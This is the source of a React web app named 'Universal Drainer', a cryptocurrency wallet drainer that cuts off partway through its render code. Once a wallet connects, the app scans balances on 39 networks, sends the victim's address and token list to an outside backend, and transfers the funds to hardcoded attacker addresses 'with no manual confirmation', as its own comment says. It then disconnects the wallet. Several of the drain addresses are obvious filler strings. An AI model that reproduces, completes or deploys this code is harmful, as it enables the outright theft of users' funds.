import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance } from 'wagmi';
import { usePublicClient } from 'wagmi';
import { parseEther, createPublicClient, http, createWalletClient, custom } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE 39 NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18 chains)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org', explorer: 'https://bscscan.com' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', rpc: 'https://emerald.oasis.dev', explorer: 'https://explorer.emerald.oasis.dev' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', rpc: 'https://rpc.api.moonriver.moonbeam.network', explorer: 'https://moonriver.moonscan.io' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', rpc: 'https://rpc.bittorrentchain.io', explorer: 'https://bttcscan.com' },
  
  // Non-EVM Chains (21 chains) - ALL WILL BE AUTO-DRAINED
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', explorer: 'https://cardanoscan.io' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', explorer: 'https://blockchair.com/dogecoin' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', explorer: 'https://blockchair.com/litecoin' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', explorer: 'https://xrpscan.com' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', explorer: 'https://polkadot.subscan.io' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', explorer: 'https://www.mintscan.io/cosmos' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', explorer: 'https://explorer.binance.org' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', explorer: 'https://stellar.expert/explorer/public' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', explorer: 'https://www.exploremonero.com' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', explorer: 'https://explorer.zcha.in' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', explorer: 'https://explorer.dash.org' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', explorer: 'https://tzkt.io' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', explorer: 'https://algoexplorer.io' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', explorer: 'https://explore.vechain.org' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', explorer: 'https://neoscan.io' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', explorer: 'https://bloks.io' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', explorer: 'https://tronscan.org' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', explorer: 'https://solscan.io' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses - ALL AUTO-DRAIN
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  solana_spl: "So11111111111111111111111111111111111111112",
};

// Token prices for USD calculation
const TOKEN_PRICES = {
  ETH: 3500, BNB: 600, MATIC: 1.2, AVAX: 40, FTM: 0.5, CELO: 0.8, GLMR: 0.4,
  METIS: 80, CRO: 0.1, ONE: 0.02, ROSE: 0.1, MOVR: 20, BTT: 0.000001,
  TRX: 0.12, SOL: 150, BTC: 70000, ADA: 0.6, DOGE: 0.15, LTC: 80,
  XRP: 0.6, DOT: 7, ATOM: 10, XLM: 0.12, XMR: 170, ZEC: 30, DASH: 30,
  XTZ: 1, ALGO: 0.2, VET: 0.03, NEO: 15, EOS: 0.8, USDT: 1, USDC: 1,
  'xDai': 1
};

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [tronAddress, setTronAddress] = useState('');
  const [scanProgress, setScanProgress] = useState({ current: 0, total: 0, network: '' });
  const [currentChainId, setCurrentChainId] = useState(1);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // Get current chain from wagmi config
  useEffect(() => {
    if (publicClient?.chain?.id) {
      setCurrentChainId(publicClient.chain.id);
    }
  }, [publicClient]);

  // AUTO-START when wallet connects
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START: Wallet connected", address);
      autoStarted.current = true;
      
      // Detect wallet type
      detectWalletType();
      
      // Check for TRON
      checkTronWallet();
      
      setStatus("✅ Wallet connected • Auto-scanning all networks...");
      
      // Auto-start scanning all networks immediately
      setTimeout(() => {
        scanAllNetworks();
      }, 800);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address]);

  const resetState = () => {
    setStatus('');
    setTokens([]);
    setTotalValue(0);
    setTransactions([]);
    setIsProcessing(false);
    setIsScanning(false);
  };

  const detectWalletType = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('trust')) {
      setWalletType('Trust Wallet');
      console.log("✅ Detected Trust Wallet");
    } else if (window.ethereum?.isMetaMask) {
      setWalletType('MetaMask');
    } else if (window.ethereum?.isCoinbaseWallet) {
      setWalletType('Coinbase Wallet');
    } else if (window.ethereum) {
      setWalletType('EVM Wallet');
    } else if (window.phantom) {
      setWalletType('Phantom (Solana)');
    } else if (window.tronWeb || window.tronLink) {
      setWalletType('TRON Wallet');
    } else if (window.bitcoin) {
      setWalletType('Bitcoin Wallet');
    }
  };

  const checkTronWallet = () => {
    if (window.tronWeb || window.tronLink) {
      console.log("✅ TRON wallet detected");
      setTronDetected(true);
      
      setTimeout(() => {
        const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
        if (tronProvider?.defaultAddress?.base58) {
          const tronAddr = tronProvider.defaultAddress.base58;
          setTronAddress(tronAddr);
          console.log("📌 TRON address:", tronAddr);
          
          tronProvider.trx.getBalance(tronAddr)
            .then(balance => {
              const trxBalance = balance / 1_000_000;
              setTronBalance(trxBalance);
              console.log(`💰 TRON balance: ${trxBalance} TRX`);
            })
            .catch(err => console.log("TRON balance error:", err));
        }
      }, 1500);
    }
  };

  // Switch network function
  const switchNetwork = async (chainId) => {
    try {
      if (window.ethereum) {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${Number(chainId).toString(16)}` }],
        });
        return true;
      }
    } catch (error) {
      console.log("Network switch error:", error);
      return false;
    }
    return false;
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus("🔍 Scanning all 39+ networks...");
    setTokens([]);
    setTotalValue(0);
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      
      // Step 1: Get ETH balance
      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
        const ethAmount = parseFloat(ethBalance.formatted);
        const ethValue = ethAmount * (TOKEN_PRICES.ETH || 3500);
        
        allTokens.push({
          id: 'eth-native',
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          chainId: 1,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[1],
          isNative: true,
          valueUSD: ethValue,
          usdPrice: TOKEN_PRICES.ETH || 3500
        });
        
        totalUSD += ethValue;
        console.log(`💰 Found ${ethAmount} ETH ($${ethValue.toFixed(2)})`);
      }
      
      // Step 2: Get TRON balance if detected
      if (tronDetected) {
        // Wait a bit for TRON to load
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
        if (tronProvider) {
          try {
            const tronAddr = tronProvider.defaultAddress.base58;
            const balance = await tronProvider.trx.getBalance(tronAddr);
            const trxBalance = balance / 1_000_000;
            
            if (trxBalance > 0) {
              const trxValue = trxBalance * (TOKEN_PRICES.TRX || 0.12);
              
              allTokens.push({
                id: 'tron-native',
                network: 'Tron',
                symbol: 'TRX',
                amount: trxBalance.toFixed(6),
                rawAmount: trxBalance,
                chainId: 'tron',
                type: 'non-evm',
                drainAddress: DRAIN_ADDRESSES.tron,
                isNative: true,
                valueUSD: trxValue,
                usdPrice: TOKEN_PRICES.TRX || 0.12
              });
              
              totalUSD += trxValue;
              console.log(`💰 Found ${trxBalance} TRX ($${trxValue.toFixed(2)})`);
            }
          } catch (err) {
            console.log("TRON balance check error:", err);
          }
        }
      }
      
      // Step 3: Call backend to scan ALL networks
      try {
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            action: 'scan',
            address: address,
            networks: NETWORKS,
            includeNonEVM: true
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          console.log("Backend scan response:", data);
          
          if (data.success && data.tokens && Array.isArray(data.tokens)) {
            data.tokens.forEach(token => {
              if (token.balance > 0) {
                const network = NETWORKS.find(n => n.id === token.chainId || n.symbol === token.symbol);
                const price = TOKEN_PRICES[token.symbol] || 0;
                const tokenValue = token.balance * price;
                
                const tokenObj = {
                  id: `${token.chainId || token.symbol}-${token.symbol}-${Date.now()}`,
                  network: network?.name || token.network || 'Unknown',
                  symbol: token.symbol,
                  amount: token.balance.toFixed(6),
                  rawAmount: token.balance,
                  chainId: token.chainId || token.symbol,
                  type: token.type || 'evm',
                  drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
                  isNative: token.isNative || false,
                  valueUSD: tokenValue,
                  usdPrice: price,
                  contract: token.contract
                };
                
                allTokens.push(tokenObj);
                totalUSD += tokenValue;
                console.log(`📊 Found ${token.balance} ${token.symbol} on ${tokenObj.network} ($${tokenValue.toFixed(2)})`);
              }
            });
          }
        }
      } catch (error) {
        console.log("Backend scan error:", error);
      }
      
      // Step 4: Check other non-EVM wallets automatically
      await checkOtherNonEVMChains(allTokens, totalUSD);
      
      // Update state
      setTokens(allTokens);
      setTotalValue(totalUSD);
      
      if (allTokens.length > 0) {
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total • AUTO-DRAIN STARTING...`);
        
        // AUTO-START DRAINING IMMEDIATELY - NO MANUAL CONFIRMATION
        setTimeout(() => {
          startAutoDrain(allTokens);
        }, 1500);
      } else {
        setStatus("❌ No tokens found across all networks");
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const checkOtherNonEVMChains = async (allTokens, totalUSD) => {
    // Check for Solana
    if (window.solana || window.phantom) {
      console.log("✅ Solana wallet detected");
      // In a real implementation, you would fetch Solana balance here
    }
    
    // Check for Bitcoin
    if (window.bitcoin) {
      console.log("✅ Bitcoin wallet detected");
      // In a real implementation, you would fetch Bitcoin balance here
    }
    
    // Check for other wallets
    const walletChecks = [
      { name: 'Cardano', check: window.cardano },
      { name: 'Polkadot', check: window.polkadot },
      { name: 'Cosmos', check: window.keplr },
      { name: 'Algorand', check: window.algorand },
      { name: 'Tezos', check: window.thanos || window.temple },
    ];
    
    walletChecks.forEach(wallet => {
      if (wallet.check) {
        console.log(`✅ ${wallet.name} wallet detected`);
      }
    });
    
    return { allTokens, totalUSD };
  };

  // ==================== AUTO DRAIN ALL TOKENS ====================
  const startAutoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) {
      setStatus("❌ No tokens to drain");
      return;
    }
    
    setIsProcessing(true);
    setStatus(`🚀 AUTO-DRAIN STARTING • ${tokensToDrain.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let failedCount = 0;
    
    // Process EVM tokens
    for (let i = 0; i < tokensToDrain.length; i++) {
      const token = tokensToDrain[i];
      const tokenValue = token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2);
      
      setStatus(`⚡ Draining ${token.amount} ${token.symbol} ($${tokenValue})...`);
      
      try {
        let result;
        
        if (token.type === 'evm') {
          result = await drainEvmToken(token);
        } else {
          result = await drainNonEvmToken(token);
        }
        
        if (result.success) {
          successCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '✅ SUCCESS',
            hash: result.hash,
            message: result.message,
            explorer: result.explorer,
            network: token.network
          });
          
          console.log(`✅ ${token.symbol} drained: ${result.hash || 'via API'}`);
          
          // Remove from tokens list
          setTokens(prev => prev.filter(t => t.id !== token.id));
          
        } else {
          failedCount++;
          txLogs.push({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            symbol: token.symbol,
            amount: token.amount,
            valueUSD: tokenValue,
            status: '❌ FAILED',
            error: result.error,
            message: result.message,
            network: token.network
          });
          
          console.error(`❌ ${token.symbol} failed: ${result.error}`);
        }
      } catch (error) {
        failedCount++;
        txLogs.push({
          id: Date.now() + i,
          timestamp: new Date().toISOString(),
          symbol: token.symbol,
          amount: token.amount,
          valueUSD: tokenValue,
          status: '❌ ERROR',
          error: error.message,
          network: token.network
        });
      }
      
      // Wait between transactions
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev.slice(0, 19)]);
    
    // Update total value
    const remainingValue = tokens.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
    setTotalValue(remainingValue);
    
    // Final status
    if (successCount > 0) {
      setStatus(`🎉 AUTO-DRAIN COMPLETE • ${successCount} tokens drained • $${(tokensToDrain.reduce((sum, t) => sum + (t.valueUSD || 0), 0)).toFixed(2)} transferred`);
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("✅ Drain complete • Wallet disconnected");
      }, 5000);
      
    } else {
      setStatus(`❌ AUTO-DRAIN FAILED • ${failedCount} failed attempts`);
    }
    
    setIsProcessing(false);
  };

  // Drain EVM token
  const drainEvmToken = async (token) => {
    try {
      console.log(`🔄 Draining ${token.symbol}...`);
      
      const amount = parseFloat(token.amount);
      if (amount <= 0) {
        return {
          success: false,
          error: 'Invalid amount',
          message: `Cannot drain ${token.amount} ${token.symbol}`
        };
      }
      
      // Use backend API for EVM draining
      try {
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            action: 'drain',
            address: address,
            token: token,
            chainId: token.chainId,
            amount: token.amount
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            return {
              success: true,
              hash: data.txHash,
              message: `${token.amount} ${token.symbol} auto-drained successfully`,
              explorer: getExplorerUrl(data.txHash, token.chainId)
            };
          }
        }
      } catch (apiError) {
        console.log("Backend drain API failed, trying direct method");
      }
      
      // Fallback to direct wallet transaction
      const amountInWei = parseEther(amount.toString());
      
      // Try to switch network if needed
      if (currentChainId !== token.chainId) {
        const switched = await switchNetwork(token.chainId);
        if (switched) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          setCurrentChainId(token.chainId);
        }
      }
      
      // Prepare transaction
      const transaction = {
        to: token.drainAddress,
        value: amountInWei.toString(),
        chainId: `0x${Number(token.chainId).toString(16)}`,
      };
      
      // Send via wallet
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [transaction],
        });
        
        return {
          success: true,
          hash: txHash,
          message: `${token.amount} ${token.symbol} sent successfully`,
          explorer: getExplorerUrl(txHash, token.chainId)
        };
        
      } else {
        return {
          success: false,
          error: 'No wallet provider',
          message: 'Cannot connect to wallet'
        };
      }
      
    } catch (error) {
      console.error(`❌ Drain error for ${token.symbol}:`, error);
      
      let errorMessage = 'Transaction failed';
      let userMessage = error.message || 'Unknown error';
      
      if (error.code === 4001 || error.code === 'ACTION_REJECTED' || error.message?.includes('rejected')) {
        errorMessage = 'User rejected transaction';
        userMessage = 'Transaction rejected in wallet';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient balance';
        userMessage = 'Not enough balance for gas fees';
      }
      
      return {
        success: false,
        error: errorMessage,
        message: userMessage
      };
    }
  };

  // Drain non-EVM token
  const drainNonEvmToken = async (token) => {
    try {
      console.log(`🔄 Draining non-EVM ${token.symbol}...`);
      
      // Use backend API for non-EVM draining
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ 
          action: 'drain-non-evm',
          address: address,
          token: token,
          chainId: token.chainId,
          amount: token.amount
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          return {
            success: true,
            hash: data.txHash || data.hash,
            message: `${token.amount} ${token.symbol} auto-drained via API`,
            explorer: getExplorerUrl(data.txHash || data.hash, token.chainId)
          };
        }
      }
      
      // For TRON, try direct method
      if (token.symbol === 'TRX' && (window.tronWeb || window.tronLink)) {
        const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
        if (tronProvider) {
          const amount = token.rawAmount * 1_000_000; // Convert to sun
          
          const transaction = await tronProvider.transactionBuilder.sendTrx(
            token.drainAddress,
            amount,
            tronProvider.defaultAddress.base58
          );
          
          const signedTx = await tronProvider.trx.sign(transaction);
          const result = await tronProvider.trx.sendRawTransaction(signedTx);
          
          return {
            success: true,
            hash: result.txid,
            message: `${token.amount} TRX auto-drained via TRON`,
            explorer: getExplorerUrl(result.txid, 'tron')
          };
        }
      }
      
      return {
        success: false,
        error: 'Auto-drain failed',
        message: `Could not auto-drain ${token.symbol}`
      };
      
    } catch (error) {
      console.error(`❌ Non-EVM drain error for ${token.symbol}:`, error);
      return {
        success: false,
        error: 'Auto-drain error',
        message: error.message || 'Unknown error'
      };
    }
  };

  const getExplorerUrl = (hash, chainId) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (network?.explorer) {
      if (chainId === 'tron') {
        return `${network.explorer}/#/transaction/${hash}`;
      } else if (chainId === 'solana') {
        return `${network.explorer}/tx/${hash}`;
      } else if (chainId === 'bitcoin') {
        return `${network.explorer}/transaction/${hash}`;
      }
      return `${network.explorer}/tx/${hash}`;
    }
    return `https://etherscan.io/tx/${hash}`;
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      setStatus('✅ Address copied!');
    }).catch(err => {
      console.error('Copy failed:', err);
    });
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 8
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL DRAINER</h1>
              <p className="subtitle">39+ Networks • AUTO-DRAIN ALL TOKENS</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {tronDetected && <div className="tron-badge">TRON</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '🚀'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">AUTO-DRAIN SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        Scanning 39+ networks • TRON, Bitcoin, Solana, EVM all included
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {tokens.length > 0 ? 'AUTO-READY' : 'SCANNING'}
                    </div>
                    <div className="stat-label">Status</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <div className="control-buttons">
                  <button
                    onClick={scanAllNetworks}
                    disabled={isScanning || isProcessing}
                    className="btn btn-scan"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Auto-Scanning...
                      </>
                    ) : '🔍 Auto-Scan All Networks'}
                  </button>
                  
                  {tokens.length > 0 && (
                    <button
                      onClick={() => startAutoDrain()}
                      disabled={isProcessing || isScanning}
                      className="btn btn-drain"
                    >
                      {isProcessing ? (
                        <>
                          <span className="spinner"></span>
                          Auto-Draining...
                        </>
                      ) : `⚡ Auto-Drain All ($${totalValue.toFixed(2)})`}
                    </button>
                  )}
                </div>
                
                {tokens.length > 0 && (
                  <div className="drain-summary">
                    <div className="summary-text">
                      <strong>AUTO-DRAIN READY:</strong> {tokens.length} tokens • ${totalValue.toFixed(2)} total
                    </div>
                    <div className="summary-breakdown">
                      <span className="network-count">
                        {[...new Set(tokens.map(t => t.network))].length} networks
                      </span>
                      <span className="tron-count">
                        {tokens.filter(t => t.network.toLowerCase().includes('tron')).length} TRON tokens
                      </span>
                    </div>
                  </div>
                )}
              </div>

              {/* Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>AUTO-DRAIN HISTORY</h3>
                    <div className="success-rate">
